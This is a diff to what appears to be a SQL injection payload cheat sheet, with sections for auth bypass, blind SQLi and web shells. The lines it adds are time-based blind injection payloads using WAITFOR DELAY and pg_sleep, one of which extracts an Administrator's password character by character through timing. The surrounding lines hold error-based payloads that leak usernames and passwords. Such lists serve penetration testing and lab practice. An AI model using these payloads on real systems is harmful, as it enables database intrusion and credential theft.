@@ -35,6 +35,9 @@ admin' or '1'='1
 administrator'
 ' OR 1=1--
 '; waitfor delay ('0:0:20')--
+'; IF (1=2) WAITFOR DELAY '0:0:10'
+'; IF (1=1) WAITFOR DELAY '0:0:10'
+'||pg_sleep(10)--
 
 // AUTH BYPASS
 
@@ -238,6 +241,9 @@ TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,3,1)='a' THEN TO_CHAR(1/0) EL
 --- Blind: Visible error-based SQLi
 TrackingId='+AND+1=CAST((SELECT+username+FROM+users+LIMIT+1)+AS+int)--
 TrackingId='+AND+1=CAST((SELECT+password+FROM+users+LIMIT+1)+AS+int)--
+--- Blind: Time Delay to reveal a password
+TrackingId=xyz'||pg_sleep(10)--
+'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
 
 // WEB SHELL
 
